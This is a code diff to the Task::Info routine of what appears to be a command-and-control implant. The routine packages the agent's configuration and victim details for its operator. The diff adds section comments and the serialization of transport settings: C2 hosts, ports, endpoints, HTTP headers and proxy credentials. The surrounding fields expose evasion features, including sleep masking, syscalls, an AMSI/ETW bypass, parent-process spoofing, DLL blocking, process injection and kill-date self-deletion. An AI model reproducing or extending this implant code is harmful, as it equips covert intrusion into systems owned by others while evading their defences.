@@ -596,9 +596,11 @@ auto DECLFN Task::Info(
 ) -> ERROR_CODE {
     PACKAGE* Package = Job->Pkg;
 
+    // basic
     Self->Pkg->Int32( Package, Self->Config.SleepTime );
     Self->Pkg->Int32( Package, Self->Config.Jitter );
 
+    // evasion
     Self->Pkg->Int32( Package, Self->Config.Mask.TechniqueID );
     Self->Pkg->Int32( Package, Self->Config.Mask.Heap );
     Self->Pkg->Int64( Package, Self->Config.Mask.JmpGadget );
@@ -608,13 +610,16 @@ auto DECLFN Task::Info(
     Self->Pkg->Int32( Package, Self->Config.Syscall );
     Self->Pkg->Int32( Package, Self->Config.AmsiEtwBypass );
 
+    // process behavior
     Self->Pkg->Int32( Package, Self->Config.Ps.BlockDlls );
     Self->Pkg->Int32( Package, Self->Config.Ps.ParentID );
     Self->Pkg->Int32( Package, Self->Config.Ps.Pipe );
 
+    // postex
     Self->Pkg->Str( Package, Self->Config.Postex.ForkPipe );
     Self->Pkg->Str( Package, Self->Config.Postex.Spawnto );
 
+    // session
     Self->Pkg->Str( Package, Self->Session.AgentID );
     Self->Pkg->Str( Package, Self->Session.ImageName );
     Self->Pkg->Str( Package, Self->Session.ImagePath );
@@ -628,6 +633,7 @@ auto DECLFN Task::Info(
     Self->Pkg->Int64( Package, Self->Session.Base.Start );
     Self->Pkg->Int32( Package, Self->Session.Base.Length );
 
+    // machine
     Self->Pkg->Str( Package, Self->Machine.UserName );
     Self->Pkg->Str( Package, Self->Machine.CompName );
     Self->Pkg->Str( Package, Self->Machine.DomName );
@@ -636,6 +642,7 @@ auto DECLFN Task::Info(
     Self->Pkg->Int32( Package, Self->Machine.OsMnrV );
     Self->Pkg->Int32( Package, Self->Machine.OsBuild );
 
+    // killdate
     Self->Pkg->Int32( Package, Self->Config.KillDate.Enabled );
     Self->Pkg->Int32( Package, Self->Config.KillDate.SelfDelete );
     Self->Pkg->Int32( Package, Self->Config.KillDate.ExitProc );
@@ -643,8 +650,34 @@ auto DECLFN Task::Info(
     Self->Pkg->Int32( Package, Self->Config.KillDate.Month );
     Self->Pkg->Int32( Package, Self->Config.KillDate.Year );
 
+    // injection
     Self->Pkg->Int32( Package, Self->Config.Injection.Alloc );
     Self->Pkg->Int32( Package, Self->Config.Injection.Write );
+
+    // transport
+    Self->Pkg->Int32( Package, Self->Config.Profile );
+
+    Self->Pkg->Int32( Package, Self->Config.Web.HostQtt );
+    Self->Pkg->Int32( Package, Self->Config.Web.PortQtt );
+    Self->Pkg->Int32( Package, Self->Config.Web.EndpointQtt );
+
+    Self->Pkg->Wstr( Package, Self->Config.Web.Method );
+    Self->Pkg->Wstr( Package, Self->Config.Web.UserAgent );
+    Self->Pkg->Wstr( Package, Self->Config.Web.HttpHeaders );
+    Self->Pkg->Int32( Package, Self->Config.Web.Secure );
+    Self->Pkg->Int32( Package, Self->Config.Web.ProxyEnabled );
+    Self->Pkg->Wstr( Package, Self->Config.Web.ProxyUrl );
+    Self->Pkg->Wstr( Package, Self->Config.Web.ProxyUsername );
+    Self->Pkg->Wstr( Package, Self->Config.Web.ProxyPassword);
+
+    for ( int i = 0; i < Self->Config.Web.HostQtt; i++ ) {
+        Self->Pkg->Wstr( Package, Self->Config.Web.Host[i] );
+        Self->Pkg->Int32( Package, Self->Config.Web.Port[i] );
+    }
+
+    for ( int i = 0; i < Self->Config.Web.EndpointQtt; i++ ) {
+        Self->Pkg->Wstr( Package, Self->Config.Web.EndPoint[i] );
+    }
 
     KhDbg("Info task completed successfully");
 
